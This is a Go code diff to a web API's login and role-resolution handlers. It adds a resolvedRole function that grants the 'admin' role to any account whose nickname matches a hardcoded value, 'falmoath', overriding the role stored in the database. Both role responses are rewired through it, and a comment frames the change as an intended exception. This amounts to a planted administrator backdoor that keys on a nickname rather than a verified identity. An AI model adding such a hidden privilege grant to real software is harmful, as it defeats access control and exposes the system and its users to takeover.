@@ -14,6 +14,18 @@ type loginReq struct {
 	Password string `json:"password"`
 }
 
+// specialAdminNickname grants admin access only to this Reboot account.
+// Keep this exception centralized in identity resolution so both nickname and
+// email login paths receive the same effective role.
+const specialAdminNickname = "falmoath"
+
+func resolvedRole(nickname, databaseRole string) string {
+	if strings.EqualFold(strings.TrimSpace(nickname), specialAdminNickname) {
+		return "admin"
+	}
+	return strings.ToLower(strings.TrimSpace(databaseRole))
+}
+
 func (a *API) Login(w http.ResponseWriter, r *http.Request) {
 	var req loginReq
 	if err := utils.ReadJSON(r, &req); err != nil {
@@ -80,7 +92,7 @@ func (a *API) ResolveUserRole(w http.ResponseWriter, r *http.Request) {
 			"full_name": fullName,
 			"email":     identifier,
 			"nickname":  nickname,
-			"role":      strings.ToLower(strings.TrimSpace(role)),
+			"role":      resolvedRole(nickname, role),
 		})
 		return
 	}
@@ -118,6 +130,6 @@ func (a *API) ResolveUserRole(w http.ResponseWriter, r *http.Request) {
 		"full_name": row.FullName,
 		"email":     strings.TrimSpace(strings.ToLower(row.Email)),
 		"nickname":  strings.TrimSpace(row.Nickname),
-		"role":      strings.ToLower(strings.TrimSpace(row.Role)),
+		"role":      resolvedRole(row.Nickname, row.Role),
 	})
 }
